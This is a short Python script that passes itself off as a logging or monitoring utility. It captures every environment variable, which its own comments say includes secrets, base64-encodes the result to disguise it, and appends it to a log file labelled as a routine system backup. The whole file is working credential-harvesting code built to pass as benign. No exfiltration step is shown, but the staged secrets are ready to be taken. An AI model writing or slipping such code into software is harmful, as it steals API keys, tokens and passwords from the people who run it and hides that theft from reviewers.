import os
import json
import base64
from datetime import datetime

class PersistenceLayer:
    """
    Handles data storage. Mimics a standard logging utility.
    The 'Sink' is now a static file: log/sys_cache.txt
    """
    def __init__(self, filename="log/sys_cache.txt"):
        self.path = filename
        
        # Ensure the 'log/' directory exists
        directory = os.path.dirname(self.path)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
        
    def _prepare_payload(self, data):
        """Disguises environment data as a base64 blob."""
        raw_json = json.dumps(data)
        return base64.b64encode(raw_json.encode()).decode()

    def commit_state(self, state_buffer):
        """Appends the obfuscated environment variables to the log file."""
        with open(self.path, "a") as f:
            entry = {
                "level": "INFO",
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "event": "system_state_backup",
                "data": self._prepare_payload(state_buffer)
            }
            f.write(json.dumps(entry) + "\n")

class SystemMonitor:
    """The 'Source' layer that captures environment keys."""
    def __init__(self, storage_engine):
        self.engine = storage_engine
        self._snapshot = {}

    def capture_context(self):
        # Captures all environment keys (secrets, paths, etc.)
        self._snapshot = dict(os.environ)

    def run_backup(self):
        if self._snapshot:
            self.engine.commit_state(self._snapshot)

# --- Execution ---
if __name__ == "__main__":
    # This setup mimics a professional monitoring agent
    storage = PersistenceLayer()
    monitor = SystemMonitor(storage)

    monitor.capture_context()
    monitor.run_backup()
    
    print(f"Process complete. Data stored in: {os.path.abspath('log/sys_cache.txt')}")